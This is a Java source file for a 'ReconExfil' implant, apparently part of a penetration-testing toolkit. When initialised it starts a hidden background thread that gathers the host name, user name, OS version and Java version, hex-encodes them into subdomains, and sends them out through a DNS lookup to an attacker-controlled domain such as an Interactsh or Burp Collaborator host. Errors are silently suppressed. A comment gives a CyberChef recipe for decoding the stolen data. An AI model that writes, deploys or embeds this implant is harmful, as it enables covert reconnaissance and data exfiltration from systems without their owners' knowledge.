package org.example.implants;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Map;
import java.util.Properties;
import java.util.Random;

public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * Top domain to use for data exfiltration.
     * Data will be encoded and included as a subdomain to this top domain.
     * Set this to a Burp Collaborator / Interactsh (or equivalent) hostname that's under your control.
     */
    static volatile String CONF_EXFIL_DNS;

    /**
     * Maximum number of characters for each subdomain.
     * DNS specifies a maximum number of 63 characters.
     * A custom value may be set if there are concerns that upstream DNS servers may dislike a large number of
     * subdomains.
     * Note: This simple implant will just exclude any excess hex digits from an over-sized field (resulting in data
     * loss).
     */
    static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                ReconExfil implant = new ReconExfil();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload(System.getenv(), System.getProperties());
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    private void payload(Map<String, String> envVars, Properties javaProps) {
        if (CONF_EXFIL_DNS == null || CONF_EXFIL_DNS.isEmpty()) {
            return;
        }

        String fullExfilDnsName = generateEncodedDomainName(envVars, javaProps);
        resolve(fullExfilDnsName);

        /*
         * CyberChef recipe to decode the full domain name collected by your DNS server:
         * 1a) Case-insensitive regex: ([0-9a-fA-F\.]+)\.[0-9]+\.[a-zA-z0-9\-]+\.oast\.fun
         * 1b) Output the capture group.
         * 2)  Split by '.' to '\n'
         * 3)  Fork. Split delimiter '\n'. Merge delimiter '\n'.
         * 4)  From hex.
         *
         * Here's a link:
         * https://gchq.github.io/CyberChef/#recipe=Regular_expression('User%20defined','(%5B0-9a-fA-F%5C%5C.%5D%2B)%5C%5C.%5B0-9%5D%2B%5C%5C.%5Ba-zA-z0-9%5C%5C-%5D%2B%5C%5C.oast%5C%5C.fun',true,true,true,false,false,false,'List%20capture%20groups')Split('.','%5C%5Cn')Fork('%5C%5Cn','%5C%5Cn',false)From_Hex('Auto')
         *
         * Just paste in any collected DNS requests. Make sure to get the "last" one with all the subdomains in it.
         */
    }

    String generateEncodedDomainName(Map<String, String> envVars, Properties javaProps) {
        String hostname = getHostname();
        String username = getUsername(envVars, javaProps);
        String osInfo = getOsInfo(javaProps);
        String runtimeInfo = getRuntimeInfo(javaProps);
        String uniqueId = getUniqueId();

        String encHostname = encode(hostname);
        String encUsername = encode(username);
        String encOsInfo = encode(osInfo);
        String encRuntimeInfo = encode(runtimeInfo);

        return encHostname + "." + encUsername + "." + encOsInfo + "." + encRuntimeInfo + "."
                + uniqueId + "." + CONF_EXFIL_DNS;
    }

    // Just hex represent it for now. This is very space inefficient, but at least it's compatible with DNS.
    static String encode(String input) {
        if (input == null) {
            input = "null";
        }

        StringBuilder hexString = new StringBuilder();
        for (byte b : input.getBytes(StandardCharsets.UTF_8)) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }

        if (hexString.length() > CONF_SUBDOMAIN_MAX_LEN) {
            // Make sure encoded output always consists of full bytes (pairs of two hex digits)
            int cutoffPos = CONF_SUBDOMAIN_MAX_LEN - (CONF_SUBDOMAIN_MAX_LEN % 2);
            return hexString.substring(0, cutoffPos);
        } else {
            return hexString.toString();
        }
    }

    // Use the default system resolver for now
    private static void resolve(String domain) {
        try {
            //noinspection ResultOfMethodCallIgnored
            InetAddress.getByName(domain);
        } catch (UnknownHostException ignored) {
        }
    }

    private static String getHostname() {
        String hostname = "unknown";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException ignored) {
        }

        return hostname;
    }

    private static String getUsername(Map<String, String> envVars, Properties javaProps) {
        String username = javaProps.getProperty("user.name");
        if (isUnknown(username)) {
            username = envVars.get("USERNAME");
            if (isUnknown(username)) {
                username = "unknown";
            }
        }

        return username;
    }

    private String getOsInfo(Properties javaProps) {
        String osName = javaProps.getProperty("os.name");
        if (isUnknown(osName)) {
            osName = "unknown";
        }

        String osVer = javaProps.getProperty("os.version");
        if (isUnknown(osVer)) {
            osVer = "unknown";
        }

        return osName + " " + osVer;
    }

    private static String getRuntimeInfo(Properties javaProps) {
        String runtimeVer = javaProps.getProperty("java.vm.version");
        if (isUnknown(runtimeVer)) {
            runtimeVer = "unknown";
        }

        return runtimeVer;
    }

    private static boolean isUnknown(String value) {
        return value == null || value.isEmpty();
    }

    private static String getUniqueId() {
        Random rng = new SecureRandom();
        return "" + rng.nextInt(0, Integer.MAX_VALUE);
    }
}